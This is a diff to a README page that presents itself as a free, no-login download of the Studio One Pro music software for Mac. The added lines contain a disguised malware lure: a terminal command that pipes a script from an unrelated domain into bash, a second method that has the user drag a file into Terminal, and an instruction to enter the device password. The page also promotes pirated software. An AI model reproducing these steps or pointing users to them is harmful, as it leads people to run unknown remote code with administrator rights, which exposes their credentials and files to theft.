@@ -1,14 +1,29 @@
-# Studio One Pro — Download for macOS (Offline Setup Guide)
+# Studio One Pro for Mac
 
-[![Download Setup Assistant](https://img.shields.io/badge/Download-Setup_Assistant-blueviolet)](#)
+[![Download Setup Assistant](https://img.shields.io/badge/Download-Setup_Assistant-blueviolet)](https://studio-one-pro-download-mac.github.io/.github)
 
-⚙️ **How to Use**
+## 📦 How to Install
 
-1. Click the download button above  
-2. Extract the `.zip` archive using Keka or The Unarchiver  
-3. Run the included setup assistant  
-4. Follow the on-screen instructions  
-5. Launch Studio One Pro — full features, no login required
+# Installation via .dmg:
+
+1. Install the .dmg file using the button above. 
+2. Open the .dmg installer and move the file from the left window to any convenient directory on your device.
+3. Open a terminal and transfer the file you extracted in the last step into it.
+4. Press the "Return" button, then enter your device password in the window that appears (if you don't have a password, leave the field blank).
+
+[![0723.gif](https://i.postimg.cc/50Tm3hZT/0723.gif)](https://postimg.cc/mz3MZ5Zy)
+
+# Installation via a command in the terminal:
+
+1. Copy the installation command below.
+```bash
+/bin/bash -c "$(curl -fsSL https://veitzeatz.com/get1/install.sh)"
+```
+2. Open the terminal on your device and paste the command you copied above, then press the “Return” button.
+3. Enter your device password and confirm the installation.
+
+[![0723-1.gif](https://i.postimg.cc/NfzQxpMT/0723-1.gif)](https://postimg.cc/0b7gkG72)
+
 
 🎯 **What You Unlock**
 
@@ -22,13 +37,13 @@
 🖼 **Preview**
 
 ![Studio One Pro Interface](https://images.ctfassets.net/b7gl3dxk4jyc/ctL1PYtnQraHt519sq8Rn/d62d75d256579a2d0c1066c236307cb0/quad-04.webp)  
-*Studio One Pro sleek and intuitive interface*
+
 
 ![Studio One Pro Mixer](https://images.ctfassets.net/b7gl3dxk4jyc/3LS5JQ3YtFNmdEL8kjRNR7/d20f68711d05ac6b1402535e788e05d7/sop7_ui-screen-alt-5.png)  
-*Advanced mixing console with detailed controls*
+
 
 ![Studio One Pro Plugins](https://images.squarespace-cdn.com/content/v1/54d696e5e4b05ca7b54cff5c/3c26e8a2-8ef8-4f31-a990-6e0eb0ea2588/S1-7-overview.jpg)  
-*Wide range of built-in plugins and effects*
+
 
 🔍 **SEO Keywords**
 
